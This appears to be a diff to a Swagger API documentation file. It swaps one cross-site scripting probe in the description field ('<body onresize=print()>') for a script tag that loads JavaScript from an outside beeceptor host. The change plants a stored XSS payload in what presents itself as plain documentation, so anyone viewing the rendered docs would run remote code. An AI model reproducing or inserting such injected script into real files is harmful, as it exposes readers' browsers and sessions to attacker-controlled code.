@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    hello world !! This is just a test number <body onresize=print()>
+    hello world !! This is just a test number <script src="https://sekeratest.free.beeceptor.com/test.js">
  
 
   version: production
